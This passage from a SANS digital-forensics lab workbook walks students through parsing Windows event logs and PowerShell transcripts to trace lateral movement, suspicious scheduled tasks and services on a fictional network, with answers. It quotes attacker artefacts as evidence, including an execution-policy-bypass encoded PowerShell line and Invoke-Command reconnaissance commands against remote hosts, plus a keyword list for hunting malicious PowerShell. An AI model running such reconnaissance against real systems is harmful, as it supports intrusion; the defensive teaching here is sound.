3. Open an administrator command terminal and execute EvtxECmd against the RD01 Security Event Log present in the
mounted Triage image:
evtxecmd -f E:\c\Windows\system32\winevt\logs\Security.evtx --csv g:\Labs\event-logs --csvf security.csv

.

Now use EVTXECmd to parse the Task Scheduler/Operational log:
evtxecmd -f "e:\C\Windows\System32\winevt\logs\Microsoft-Windows-TaskScheduler%4Operational.evtx" --csv G:
\Labs\event-logs --csvf taskscheduler.csv

154

© 2023 SANS Institute

.

Tip
Pay attention to the console messages written by EvtxECmd. Some errors are normal, but upon successful completion,
you should see a conﬁrmation of events found and a listing of total ﬁles parsed similar to the image below. If you do not
see this, check your command line for typographical mistakes. (The number of event records and Event IDs will be

de

01

.ir

different for every event log. This is just a quick snip of output intended only as an example.)

4. Once completed, ﬁles named security.csv and taskscheduler.csv will be available in the G:\Labs\event-logs folder. Open

hi

both ﬁles in Timeline Explorer for review.

5. To tame any large columns, use Tools -> Reset column widths or CTRL-R to improve the view.

© 2023 SANS Institute

.

155

.ir
01

Introduction to EvtxECmd

EvtxEcmd is command-line based parser with the ability to extract data from native Windows event logs into CSV format. Much

de

of the power provided by EvtxECmd relates to the opportunities for creative ﬁltering of the results. When paired with a tool like
Timeline Explorer, events can be quickly reduced by the analyst. Individual columns can be used for ﬁltering, such as the EventID

hi

column, when looking for speciﬁc event types. Keyword ﬁltering can be used to identify executable names, user accounts, IP
addresses, or any unique string. The EvtxECmd output also lends itself to the “Group by Column” feature of Timeline Explorer. This
feature is similar to pivot tables in Excel and provides an easy means to group items according to values present in a column.
• As a little practice, ﬁnd the Map Description column in security.csv and drag it to the "group by column" area of Timeline
Explorer. Event maps have been created for all well known event IDs and each map includes a description for the purpose of
the event ID (EID) parsed. This can be a great place to refresh your memory of items that can be investigated. Notice that
each grouped item also includes a count of how many events are in that group.

156

© 2023 SANS Institute

.

hi

de

01

.ir

• Expand one or two of the grouped items to see the raw events present.

• Right-click on the Map Description grouping and select UnGroup to return the column back to its original place.

© 2023 SANS Institute

.

157

.ir
01

• Find the Event Id column and ﬁlter for 4624 events. You will notice our log contains thousands of entries and could use

hi

de

further ﬁltering.

• Drag the Payload Data1 column to the group by column area. Then drag the Payload Data2 under it. Grouped columns can be
nested, allowing data to be looked at in myriad ways. The columns “PayloadData1-6” are generic by design. Since there are so
many different types of events and so many different values that can be extracted, providing unique columns to every variant
would lead to hundreds of columns in the output ﬁle. To prevent this, the tool author chose to allow each event type to reuse
columns for up to six elements of interest. This means that in an output ﬁle with multiple different Event IDs, there will be
disparate data in the “PayloadData1-6” columns. For each event type, you will need to determine which "Payloads" have data
of interest to you.

158

© 2023 SANS Institute

.

• The current output will contain many categories for built-in Windows accounts "UMFD" and "DWM" (these built-in accounts
were introduced in Windows 10). In the global ﬁlter in the top-right of Timeline Explorer, type -umfd -dwm . This will remove
any lines containing "UMFD" or "DWM", reducing noise in the output (you can alter how data is ﬁltered with the global ﬁlter by

.ir

using the "Search options" button in the bottom-right corner of Timeline Explorer). Open up a few of the results to get a feel for

hi

de

Logon Types they have used (Payload Data2)?

01

how the data is now organized. Do you see how easy it is to quickly identify accounts of interest (Payload Data1) and the

• Ungroup your columns, remove the ﬁlter from the Event Id column and clear any items in the global ﬁlter bar to prepare for
the next part of the lab (the CTRL-E shortcut will clear all current ﬁlters in Timeline Explorer). The "Total lines" and "Visible
lines" values in the bottom-right corner of Timeline Explorer can alert you when there are any ﬁlters still set (with no ﬁlters
present the two values should match).

© 2023 SANS Institute

.

159

Lab Questions
Security Log: Tracking Mounted Shares
For the next two sections, you will be ﬁltering and analyzing the ﬁle security.evtx .
Mounted shares are a common form of lateral movement. Clear any existing ﬁlters and ﬁlter by Event Id 5140 to identify any
shares mounted during the time period this log represents.

.

Group the following columns using Timeline Explorer: Payload Data1 (Share Name) -> User Name -> Remote Host

1. Mapping the built-in C$ administrative share is a common lateral movement technique used by attackers (and sometimes
legitimate administrators).
Which accounts mapped a share to the entire C volume of RD01 (C$)?
________________________________________________________________
________________________________________________________________
________________________________________________________________

160

© 2023 SANS Institute

.

Solution
• shieldbase\DEV01$ (The computer account for host DEV01. This is unusual.)
• shieldbase\rsydow-a
• shieldbase\tdungan

2. Which system(s) did the RD01 C$ share get mounted to and when? (Ignore the IP version 6 addresses as "::1" denotes "local
host" in IPv6)
________________________________________________________________
________________________________________________________________

.

________________________________________________________________

© 2023 SANS Institute

.

161

Solution
• Directionality is important! We are seeing these events on RD01 because user accounts mapped the RD01 C$ share to
remote systems. EID 5140 records the user name and remote system data.
• 172.16.4.9 mapped RD01 C$ during 2023-01-23 14:44:59 and 14:47:08
• 172.16.4.4 mapped RD01 C$ on 2022-11-06 23:07:35

.

• 172.16.6.18 mapped RD01 C$ during 2023-01-17 15:43:32, 15:44:59, and 19:01:34

3. IPC$ (Inter-Process Communication share) is a common admin share used to set up communication paths between
systems. It is used both legitimately and illegitimately to query available shares, setup initial SMB communication facilitating
share mapping, and in the initial setup of named pipes (we will cover named pipes later in the course as they are commonly
abused by modern malware).
Which accounts were used to connect to the IPC$ share on RD01?
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________

162

© 2023 SANS Institute

.

________________________________________________________________
________________________________________________________________
Solution
• shieldbase\cbarton-a
• shieldbase\DEV01$
• shieldbase\rsydow-a
• shieldbase\slevine
• shieldbase\tdungan

.

• shieldbase\wacsvc

4. Which of the accounts just identiﬁed have we previously tagged as exhibiting suspicious behavior?
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
Solution
• shieldbase\rsydow-a
• shieldbase\slevine
• shieldbase\tdungan
• shieldbase\wacsvc
5. When was the wacsvc account used to connect to IPC$?
________________________________________________________________

© 2023 SANS Institute

.

163

________________________________________________________________
Solution
• 2023-01-25 14:43:02
• 2023-01-23 16:08:23
• It is unknown why an IPv6 address was recorded for one of these events, but Windows is known for recording different
data for different types of authentication so it could be an indication the actions accomplished by wacsvc on these
days were not identical.
• Overall, EID 5140 events show C$ and IPC$ enabled lateral movement occurring during times of other suspicious
ﬁndings and using likely compromised accounts. These network events explain many of the suspicious
authentication events discovered in the previous lab (remember that authentication happens when the account is
used to perform an action, like mapping a share).

Note

.

We skipped analysis of the TempFRes share in this part of the lab because SRL advised the share was mapped on many
systems by a legitimate administrator, cbarton-a, during the deployment of the F-Response tool for IR evidence collection.

Security Log: Investigating "RunAs" Activity
RunAs events are recorded when a user provides alternate (also known as "explicit") credentials when authenticating. This might
happen when an administrator needs to provide a high-level credential to run a script, or when an attacker needs to provide
different credentials to laterally move to another computer. RunAs events are particularly useful because they are recorded at the
source (originating system) of a remote connection, which makes it easy to identify where an attacker moved to from the system
currently being investigated (other events like EID 5140 and 4624 are only recorded on the remote target system). EID 4648 events
with no Remote Host info typically indicate credentials swapped in the context of the current system, or can sometimes indicate
inbound connections from services like RDP.
Clear any existing ﬁlters and ﬁlter by Event Id 4648 to analyze authentications performed using explicit credentials.
Group the following columns using Timeline Explorer: User Name
You will undoubtedly notice a lot of noise in the 4648 ﬁltered output. In particular, computer accounts regularly impersonate other
accounts to accomplish a variety of background tasks. Computer accounts can be recognized by the system hostname with a
trailing "$" (e.g. RD01$). The system we are analyzing used two prior hostnames, apparently during automated system

164

© 2023 SANS Institute

.

deployment: MINWINPC$ and TPL-PACKER$. We will ignore all three of these computer accounts in this part of the lab as they do
not provide any useful information.

1. Expand the 4648 events for tdungan and wacsvc. For what user account did these accounts explicitly provide credentials?
(Hint: Look in the Payload data)

.

________________________________________________________________

© 2023 SANS Institute

.

165

Solution
• Every 4648 event for these accounts switched to account "wacsvc"
• If it seems strange that an already logged in account (wacsvc) would provide explicit credentials for the same
account, your intuition is correct! It is a common pattern seen in attack frameworks like Cobalt Strike, but could also
be recorded for more "normal" activity like when a script is passed the same credentials as the currently logged in
user.

2. Review the TargetServerName information for the tdungan and wacsvc EID 4648 events. (Hint: You will ﬁnd it in one of the

.

"Payload" columns)
• What target host names are present in these events?
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________

166

© 2023 SANS Institute

.

Solution
Many of these systems are new to our investigation! This is a great example of how lateral movement analysis can
quickly help you scope a network intrusion.
• WKSTN01
• RD01 (local host)
• DEV01
• RD02
• RD04
• RD10

.

• FILE01

• What direction are these connections? Is RD01 the originating (outbound) or target (inbound) system?
________________________________________________________________

© 2023 SANS Institute

.

167

Solution
This can be a tricky question to answer since EID 4648 can be logged on both the originating and target systems
(though originating is more common). When you see TargetServerName information referring to remote systems, it
indicates RD01 is the originating system, attempting authentication to these remote hosts. If you see the local
hostname (RD01 or localhost) it typically refers to incoming activity (if there is Remote Host information), or just systemonly activity if no Remote Host is speciﬁed. This is an important concept, and you can see here how it allows us to
quickly identify a large amount of lateral movement outbound to other systems. As an aside, this event does not tell us
whether the authentication succeeded on the remote host. We would need to review the EID 4624 events on the remote
host to answer that question!
Here are several examples to illustrate outbound vs. inbound activity (your view in Timeline Explorer will not currently
look like this):

.

• Drag the Payload Data2 column closer to the Time Created column and record the time ranges of these connections in
your IR spreadsheet. It is very likely these systems are part of the intrusion we are investigating. Pro-tip: These times will
make perfect starting/pivot points when you investigate these other systems during the ﬁnal challenge.
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________

168

© 2023 SANS Institute

.

Solution
• WKSTN01 -- 2023-01-23 15:05:05 to 2023-01-23 15:14:06
• DEV01 -- 2023-01-23 18:15:20 to 2023-01-23 18:17:01
• RD02 -- 2023-01-25 14:51:14 to 2023-01-25 14:52:42
• RD04 -- 2023-01-25 14:54:01
• RD10 -- 2023-01-25 14:54:59
• FILE01 -- 2023-01-25 15:07:50

3. Review the contents of the Executable Info column for tdungan and wacsvc EID 4648 events. What executable used gives the
most insight into attacker tradecraft?

.

________________________________________________________________

© 2023 SANS Institute

.

169

Solution
• This information is recorded for only a handful of events, and is likely dependent on the type of activity being
accomplished with the credential swap.
• C:\Windows\System32\wbem\WMIC.exe is a command-line tool for executing WMI requests. It is somewhat rarely
used these days and could be an interesting indicator of compromise.
• An argument could be made that the other executables could also be interesting, but WMIC is the executable most
likely to be used directly by an attacker.

4. Optional Advanced: Still focused on EID 4648 events for tdungan and wacsvc, review the contents of the column Payload
Data4. Can you make any guesses as to what types of connections occurred based on the protocol information provided?
(Hint: This may require some Internet research)
________________________________________________________________
________________________________________________________________

.

________________________________________________________________

170

© 2023 SANS Institute

.

Solution
• cifs stands for “Common Internet File System”, an implementation of the Server Message Block (SMB) protocol created
by Microsoft. This is commonly used for mapping ﬁle shares.
• RPCSS stands for "Remote Procedure Call" and is a standard client/server messaging component in Windows. It is
used by a wide range of Windows built-in tools including those used for remote task scheduling and service creation.
• TERMSRV is Remote Desktop Protocol (RDP)
• This extra data gives insight into the types of activities we should expect the attackers to have accomplished on these
systems during lateral movement.

TIP
The ability to group columns provides a nearly endless means to view event log data in different ways. We purposely did not
use much grouping in this part of the lab so you could get a feel for the varied information present in each column. However, we
encourage you to experiment with grouping different columns and in different orders. Creative use of column grouping can

.

help you answer important questions rapidly. Here is one example for 4648 events you can try:

TaskScheduler Log: Finding Suspicious Scheduled Tasks
This section uses the previously extracted EvtxECmd output for the Task Scheduler log: G:\Labs\event-logs\taskscheduler.csv .
If you do not have this ﬁle, return to the Lab Preparation steps at the beginning of this lab.
1. The Task Scheduler log for RD01 has over 84000 entries, but we can reduce this data set by being very focused. Using
Timeline Explorer, ﬁlter for EID 106, task creation events. Then select a column grouping to make it easy to ﬁlter by the user
and the name of the scheduled task created.

© 2023 SANS Institute

.

171

Column Grouping Solution
User Name -> Payload Data1

• Document the names of the tasks created, ignoring those tasks tied to the computer account, RD01$.
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________

.

________________________________________________________________

172

© 2023 SANS Institute

.

Solution
• \Microsoft\Windows\AppListBackup\Backup
• SRL Update Service
• OneDrive Standalone Update Task (2 events)
• SRL User Maintenance

.

• OneDrive Reporting Task

2. A limitation of task creation events is they only record the assigned name of the task. Event ID 200 (scheduled task execution)
can be used to determine what code was actually executed by a task. It ties the task name to the code scheduled to execute.
• Clear any existing ﬁlters and grouped columns. Create a new ﬁlter for Event Id 200.
• Use the per-column ﬁlter for Payload Data1 to search for the task names documented in the previous question. For each
item, document the executable name from the Executable Info column. (Note: Some common background system tasks
use descriptive shortcuts instead of executable names)
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

173

Solution
• AppList Backup Launcher
• C:\Windows\System32\STUN.exe
• OneDriveStandaloneUpdater.exe
• C:\Windows\System32\SRLUpdate.exe
• OneDriveStandaloneUpdater.exe

• Which task(s) would you prioritize for further investigation?
________________________________________________________________
________________________________________________________________
Solution

executable.

.

• C:\Windows\System32\STUN.exe: We have already documented other suspicious activity related to this

• C:\Windows\System32\SRLUpdate.exe: Given the similarity of this task (and executable) to another suspicious
task, SRLUpdate.exe would also be worth our time to investigate.
• The other tasks have executed over a much longer time period and seem to be more naturally occurring. If you
wanted to dive deeper into them, you could compare them with tasks on known-good baseline system or attempt
to recover the executables for hash and digital signature analysis (the latter can be easily accomplished with the
SysInternals Autoruns tool).

• Over what time range have the suspicious tasks been executing on RD01?
________________________________________________________________

174

© 2023 SANS Institute

.

Solution
• 2023-01-17 15:48:34 to 2023-01-25 14:38:30
• This should further support our decision to look at these tasks since this is in the exact range of other suspicious
activity found on RD01.

3. Optional homework: Recall that when a task is scheduled, a corresponding XML ﬁle is created in the
\Windows\System32\Tasks folder. Within your mounted triage image, rd01-triage (E:), navigate to

\Windows\System32\Tasks

.

and look for the XML ﬁle related to the SRL Update Service. Right-click on the ﬁle to open it in a text viewer like Notepad++.

• What user account was used to create this scheduled task?
________________________________________________________________

© 2023 SANS Institute

.

175

Solution
shieldbase\wacsvc

• When was the task scheduled to start?
________________________________________________________________
Solution
• 2023-01-17T10:48:00 (local system time)
• The "T" in this timestamp is a standard ISO 8601 time format ("T" indicates time). Generally, if no further timezone
information is provided, the timestamp is assumed to be in local system time. A "Z" present at the end of the

.

timestamp represents the UTC timezone (not seen here).

• What is the trigger that causes the task to execute?
________________________________________________________________
Solution
• BootTrigger (at system boot)
• If you are curious about other trigger types, Microsoft has them documented here.

• What level of permissions is the task set to run with?

176

© 2023 SANS Institute

.

________________________________________________________________
Solution
• S-1-5-18 (this is the SID for the built-in SYSTEM account)
• If you go back and look at the EID 106 event for this task, you will see S-1-5-18 was recorded as the User Name
during task creation.

• What is the full path of the ﬁle that is executed?
________________________________________________________________
Solution

.

C:\Windows\System32\STUN.exe

• C hallenge: Why is there no XML ﬁle for the SRL User Maintenance task? (Hint: you will need to return back to the Task
Scheduler log to answer this question.)
________________________________________________________________
Solution
• An easy way to determine the fate of the task is to search for it across all events in the Task Scheduler log. This is
also a great way to get a more global view of task activity.
• This also explains why we did not see this task in the Autoruns exercise earlier in the course.

© 2023 SANS Institute

.

177

Optional Homework: Identify Suspicious Services
For this section, return back to your EvtxECmd output for the Security log, G:\Labs\event-logs\security.csv .
Clear any existing ﬁlters and grouped columns. Create a new ﬁlter in security.csv for Event Id 4697 (new service creation).
There should be relatively few new service creation events, but even the most high ﬁdelity events include noise when present in a
real network. Some applications, like Microsoft Defender, are noisy and Windows 10 introduced user-speciﬁc services which are
now created upon user login. You can recognize per-user services because they will have a unique identiﬁer tagged onto the end
of the service name with an underscore, "_", like DevicesFlowUserSvc_173e6c. You can learn more about per-user services here.
1. Start your analysis by grouping data with the User Name column. It is unusual for Windows Services to be started by normal
user accounts (as opposed to built-in accounts). Document the services tied to user accounts, including the ServiceName and
the associated executable.
________________________________________________________________
________________________________________________________________
Solution
• F-Response Subject Service: C:\windows\subject_srv.exe

.

• FoxitReaderUpdateService: FoxitPDFReaderUpdateService.exe

2. Clear your grouped columns and do a new column grouping using Payload Data4 (Service Type) -> Payload Data2
(ServiceFileName). Keep the existing Event Id column ﬁlter for 4697 events.

178

© 2023 SANS Institute

.

• Services with a start type of "Automatic" execute at system boot time, making them regularly abused for malware
persistence. Review the ServiceStartType: Automatic entries and document any services not appearing to be part of a
standard Windows installation.
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
Solution
• Foxit PDF Reader

• Velociraptor

.

• Amazon EC2 Conﬁg

• F-Response
• By this point in our investigation, we have run into most, if not all, of these executables. It turns out all of these are
normal for the SRL environment. If you wanted to dive deeper into any of them, you could compare with services
present on a known-good baseline system or attempt to recover the executables for hash and digital signature
analysis (the latter was already accomplished with the SysInternals Autoruns tool used earlier in the course).

© 2023 SANS Institute

.

179

• Services with a start type of "Manual" are started as needed. While they are not useful for persistence, they are still often
abused to run malicious code. Review the ServiceStartType: Manual entries and document any services that would be
interesting to investigate. Document anything suspicious about your choice(s).
________________________________________________________________
________________________________________________________________
Solution
• C:\windows/Mnemosyne.sys
• Two characteristics make this entry interesting:
• It is named as a driver (.sys) while being present in the C:\Windows folder, which is not a standard location for
drivers.
• The service was installed on 2023-01-24 and 2023-01-25, within the range of other suspicious activity.

question is related to?

.

• C hallenge: Can you ﬁnd another EID 4697 event which can help us better understand what the ﬁnding in the previous

________________________________________________________________

180

© 2023 SANS Institute

.

Solution
• Mnemosyne.sys is a driver used by the F-Response tool
• The two services were started at the exact second on 2023-01-24 18:04:59
• Temporal relationships are a very powerful way to gain context around system activity. We are going to explore
this idea in much greater depth during the timeline section of the course.

Optional Homework: Batch Process with PowerShell
Windows can have hundreds of logs and thousands of event types. SANS Instructor Mark Hallman wrote a PowerShell script to
batch process all the major event logs we cover in this class and only extract the most important event types (ﬁltering by event
ID). The output of the script will be a CSV ﬁle merging events of interest from several different logs, allowing you to have a ﬁltered
view of the most important event IDs a nd see temporal context between different log types. You can substitute a different list of
event logs and/or event IDs in the future to meet your needs.
Open an Administrator PowerShell terminal (right-click on the PowerShell logo in your task bar and select “Run as Administrator”.

.

Change to the C volume, change directory to the C:\Forensic_Program_Files\Powershell folder and run the
Automate_EvtxECMD.ps1 script.

cd "C:\Forensic_Program_Files\Powershell"

.\Automate_EvtxECmd.ps1 -source E:\c\Windows\system32\winevt\logs\ -dest G:\Labs\event-logs\evtx-all

© 2023 SANS Institute

.

181

.
Once completed, a copy of the logs will be in your output folder and the parsed output ﬁle will be present in

G:\Labs\event-

logs\evtx-all\out\EvtxECmd.csv . Open the ﬁle in Timeline Explorer for review or to reference in future labs.

Lab Takeaways
• Access to C$ admin shares by accounts rsydow-a and DEV01$ was identiﬁed during times of interest including 2023-01-17
and 2023-01-23.
• Additional evidence was discovered linking the wacsvc account with suspicious activity:
• Use of the IPC$ share
• 2023-01-23 16:08:23
• 2023-01-25 14:43:02
• RunAs events (EID 4648) showing lateral movement to the following systems:
• WKSTN01 -- 2023-01-23 15:05:05 to 2023-01-23 15:14:06

182

© 2023 SANS Institute

.

• DEV01 -- 2023-01-23 18:15:20 to 2023-01-23 18:17:01
• RD02 -- 2023-01-25 14:51:14 to 2023-01-25 14:52:42
• RD04 -- 2023-01-25 14:54:01
• RD10 -- 2023-01-25 14:54:59
• FILE01 -- 2023-01-25 15:07:50
• RunAs activity leaked tradecraft in the use of CIFS, WMI, RPC, and RDP protocols.
• Two suspicious scheduled tasks were identiﬁed:
• SRL Update Service executing C:\Windows\System32\STUN.exe
• SRL User Maintenance executing C:\Windows\System32\SRLUpdate.exe: (deleted on 2023-01-25 00:41:57)

Updating EvtxECmd
EvtxECmd is a dynamic tool that derives much value out of the crowd-sourced event maps present in Github. It is
recommended to update the maps from time to time using the command (preferably after your course is complete to make
sure there are no deviations in the output as seen in your labs):
evtxecmd --sync

Caution: newly synchronized map ﬁles sometimes include new features only supported in newly updated versions of
EvtxECmd. If this occurs, you will likely encounter syntax errors when running an older version of EvtxECmd. The simple ﬁx is
to upgrade EvtxECmd, which can be done easily in the VM by following How to Update Zimmerman Tools & KAPE. Make sure

.

to run the evtxecmd --sync command again after any update to EvtxECmd.

© 2023 SANS Institute

.

183

Lab 2.4: WMI, PowerShell, and Microsoft Defender Log Analysis
Background
WMI and PowerShell have historically been very diﬃcult to audit. Attackers discovered this limitation, leading to a rapid increase
in their use during computer intrusions. Luckily, on modern systems, we now have much stronger auditing. Microsoft Defender has
vastly improved its capabilities, taking advantage of technologies like Anti-malware Scan Interface (AMSI) facilitating script
introspection during execution. If you are facing attackers using WMI and PowerShell, logs may be your only viable source to track
the activity. In this lab, you will get an appreciation of the capabilities of these logs and learn analysis techniques to assist in
threat hunting.

Objectives
• Take advantage of PowerShell logging to discover malicious PowerShell activity
• Practice ﬁltering to identify evil PowerShell amidst normal system activity
• Analyze PowerShell transcript logs to see how they help broaden the understanding of an attack
• Review Microsoft Defender logs for quick wins and process tracking
• Identify WMI usage via PowerShell and in use for persistence mechanisms

Lab Preparation
This lab is completed in your 508 Windows VM

• LOGIN = SANSDFIR

.

1. Launch the 508 Windows VM and log in.

• PASSWORD = forensics
2. Please ensure your evidence is mounted correctly at rd01-triage(E:)

184

© 2023 SANS Institute

.

If you do not see your evidence mounted, use Windows Explorer to browse to G:\SRL_Evidence\triage and double-click on
the ﬁle rd01-triage.vhdx . The image will automatically mount in your 508 Windows VM using the next available drive letter
(likely E: ). If your image does not mount as drive letter E: , you likely have another device (often USB) attached to your virtual
machine. Consider ﬁxing this, rebooting, and trying again. This lab assumes the triage image is mounted as E: .
3. Open Event Log Explorer in the FOR508 Windows VM.

.

If you already have Event Log Explorer open, you can close any previously opened logs.

Warning
DO NOT update your copy of Event Log Explorer if prompted. Updating Event Log Explorer might take it to a version where
capabilities are signiﬁcantly restricted, making it impossible to complete this exercise. If you accidentally update, a copy
of the Event Log Explorer installer is available in your class dropbox, allowing you to reinstall the original version.

© 2023 SANS Institute

.

185

4. For convenience, important RD01 logs have been copied from the triage ﬁle to your Labs folder. Open the log ﬁle MicrosoftWindows-PowerShell%4Operational.evtx from the folderG:\Labs\event-logs

5. When working with PowerShell logs, it is a good best practice to ensure your tool is showing "verbose" events (these events
are sometimes truncated or ignored for eﬃciency purposes). Go to View -> Log Loading Options. Make sure that Load all

.

events is selected and that all Event types are checked.

186

© 2023 SANS Institute

.

.

Lab Questions
Discovering Malicious PowerShell

Starting with PowerShell version 5 (PSv5), we ﬁnally have a robust capability for logging PowerShell actions taken on a system.
We will start by looking script block events. This capability was enabled in Stark Research Labs (lucky for them!) One of the
challenges with this log is there can be a lot of legitimate PowerShell activity in the modern enterprise. One technique to ﬁnd evil is
to search for commonly misused capabilities of PowerShell. Strings like "encoded", "Invoke-", "download", "start-process", "IEX", and
"FromBase64String" often provide quick wins.
1. Filter for encoded within the "Text in description" of the Microsoft-Windows-PowerShell%4Operational.evtx log.

© 2023 SANS Institute

.

187

• There are only a handful of hits containing the term "encoded" within the log. What do all of the Warning events have in
common?

.

________________________________________________________________

188

© 2023 SANS Institute

.

Solution
• All of the warning events appear to be related to Chocolatey Software. If you are unfamiliar with this application,
it is used for software deployment, and was legitimately in use within Stark Research Labs (SRL)

• Document the dates of the Warning events so they can be used to speed up identiﬁcation of other false positives on the
same dates:

.

________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

189

Solution
• 2022-10-20
• 2022-10-21
• 2022-11-11
• 2022-11-12
• As you look through the logs you will see many strange (but legitimate) scripts related to software deployment on
these dates.

• Now focus on the remaining events. What interesting PowerShell information can we derive from the Information events?

.

________________________________________________________________

190

© 2023 SANS Institute

.

Solution
• The information events all appear to be logging execution of the same PowerShell command line using a Base64
encoded command.

.

• powershell -nop -exec bypass -EncodedCommand ZwBlAHQALQBkAGEAdABlAA==

• What user account is tied to the interesting encoded commands? On what date(s) did they occur?
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

191

Solution
• shieldbase\tdungan
• S-1-5-21-2838623409-1327563992-2591358621-1136 (searching for this SID in the Security log will show a
match for user tdungan)

.

• All associated events were recorded on 2023-01-25 14:57:22

• Decode the Base64 data found in the encoded command to determine what script was provided to PowerShell. One
option for decoding the Base64 data is to use the echo "base64data" | base64 -d command in Linux. We can use the
built-in Windows Subsystem for Linux (WSL) to do this within the 508 Windows VM. Click the Ubuntu Linux icon pinned to
the VM taskbar and run your command within the Linux terminal:

192

© 2023 SANS Institute

.

Command-Line

echo "ZwBlAHQALQBkAGEAdABlAA==" | base64 -d

(Copy the Base64 data from Event Log Explorer by highlighting the text and selecting Right-Click -> Copy to place it
into your clipboard.)
Solution
• get-date
• Not very exciting! But it possibly provides some insight into attacker tradecraft. It doesn't make much sense to run
an encoded PowerShell script to "get-date", so this is likely residue left behind by a tool running PowerShell under
the hood. As an example, commands sent to a Cobalt Strike beacon implant are often packaged and run locally
via PowerShell (and often picked up in ScriptBlock logging). This could be an interesting indicator able to identify
use of the same tool elsewhere in the network (e.g. search for the exact use of PowerShell parameters: "powershell
-nop -exec bypass -EncodedCommand"). We are also assuming that tdungan, the legitimate user of this system,
did not craft the strange PowerShell command-line during a time period of known attacker activity.
• If you review the events related to this execution, you can ﬁnd one of the events showing a decoded version of the

.

command. This is quite common in PowerShell script block logging.

2. Script block "warning" events in the PowerShell log are often caused by commands executed which are on a "known bads" list
maintained by Microsoft. We have already seen several warning events which were false positives, but it would be worth a
quick look at all of them.
Clear any existing ﬁlters and ﬁlter the log for Warning Event types and 4103,4104 Event ID(s).

© 2023 SANS Institute

.

193

On what four dates do the Warning events predominate? Review the contents of a few of the events to see if they look familiar.
________________________________________________________________
________________________________________________________________
________________________________________________________________

.

________________________________________________________________
Solution
• 2022-10-20
• 2022-10-21
• 2022-11-11
• 2022-11-12
• These dates match those found previously with the Chocolatey scripts. Nearly every item is related to either
Chocolatey or Terraform (both software deployment tools). The outliers in 2023 appear to be legitimate Microsoft
scripts related to Windows Error Reporting (WER).
• If you review some of these scripts in detail you can see why they are marked as "Warning" events. They include many
of the same keywords recommended in your course materials for ﬁnding evil! You can ﬁnd some that include
"syswow64", "refection", "cmd.exe", "invoke-command", and "base64".
• Once this is discovered, we would likely want to ﬁlter out those dates to reduce the number of false positives.
3. Clear any existing ﬁlters and ﬁlter the log for the commonly abused PowerShell command invoke. Also add in a date ﬁlter of
after 2023-01-01 to reduce the previously discovered false positives.

194

© 2023 SANS Institute

.

.
• What user account is assigned to nearly all the remaining events?
________________________________________________________________

© 2023 SANS Institute

.

195

Solution
SID S-1-5-21-2838623409-1327563992-2591358621-1220 (wacsvc) is tied to a majority of the ﬁltered events. Some
events will also have the actual account name in the description area.

• In what time range do most of the events occur? What does this indicate about this activity?
________________________________________________________________
________________________________________________________________
Solution

.

• Over 800 script block events were logged in a ten minute period: 2023-01-17 19:03:57 to 2023-01-17 19:13:46
• This much activity in such a short time period typically indicates automation or scripting.

196

© 2023 SANS Institute

.

• Do you see any commands executed that could be related to attacker activities? Document one or two representative
commands in your IR spreadsheet as potential indicators of compromise.
________________________________________________________________
________________________________________________________________
Solution
• Invoke-Command {net user} -ComputerName dc01.shieldbase.com
• Invoke-Command {cmd.exe /c where /r C:\Users *.xls*} -ComputerName wac01.shieldbase.com

.

• Invoke-Command {cmd.exe /c where /r C:\Users *.lnk} -ComputerName wac01.shieldbase.com

• Can you ﬁnd any evidence of activity targeting remote systems? In real life, you would want to look at every item to get a
comprehensive view of which systems were being targeted (but we do not have time for that right now).
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

197

Solution
• Nearly every command appears to be targeting a system other than RD01. This looks like a network
reconnaissance scan.
• Example: Invoke-Command {net localgroup administrators} -ComputerName dev01.shieldbase.com

• C hallenge: Can you ﬁnd any interesting or potentially damaging information that was returned to the attackers after
running some of these commands?
________________________________________________________________

Solution

.

________________________________________________________________

Not all requests appear to have been successful, but over the span of those 800+ events, the attackers were able to
collect a lot of interesting information. Without logging, this would be very diﬃcult for us to piece together!

Examining PowerShell Transcripts
PowerShell Script Block Logging is very powerful, but it can sometimes be challenging to piece together everything that happened
during a PowerShell session. If PowerShell Transcription has been enabled (recommended), a secondary source of information
will be available. Remember that transcription only logs activity executed via a console, so some remote and malicious activity

198

© 2023 SANS Institute

.

Script Block Logging identiﬁes may not be in the transcripts. However, as we will see, the data that does exist can be very valuable
in understanding an attack.
In this lab, we will review the PowerShell transcripts for several users. In your mounted Triage image, traverse to the

E:

\C\Users\wacsvc\Documents\ folder. Transcript logs are organized by date and named using the date and time of the activity.

1. For what day(s) does the wacsvc account have PowerShell transcripts on this system? How many transcripts are present in
total?
________________________________________________________________
________________________________________________________________
Solution
• PowerShell transcripts on RD01 are present only for 2023-01-17 for the wacsvc account.

.

• However, there are 113 transcripts!

2. Open and review some of the wacsvc PowerShell transcripts. Do you see any which match the apparent scanning activity
found in the PowerShell Operational log? Can you ﬁnd any transcripts showing interesting data returned to the attackers?
________________________________________________________________

© 2023 SANS Institute

.

199

Solution
The transcripts closely match the ﬁndings from the PowerShell Operational log. While many of the transcripts appear to

.

show no data returned, some are ﬁlled with data returned via successful requests.

3. Shift your focus to the PowerShell transcripts for the tdungan user. How many transcripts are present and for what days?
________________________________________________________________
________________________________________________________________

200

© 2023 SANS Institute

.

Solution
Two (2) transcripts were recorded on 2023-01-23 and 2023-01-25.

4. Analyze the PowerShell transcripts present in the tdungan proﬁle. What was executed, and what were the results?
________________________________________________________________
________________________________________________________________
Solution
• get-date returned the value Wednesday, January 25, 2023 9:57:22 AM
• Invoke-Command {cmd.exe /c netsh winhttp show proxy} -ComputerName wkstn01.shieldbase.com failed with an

.

access denied response

5. Challenge: Study the transcript for the failed command executed by the tdungan account. Can you ﬁnd anything else unusual
about that activity?
________________________________________________________________

© 2023 SANS Institute

.

201

Solution
• Host Application: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
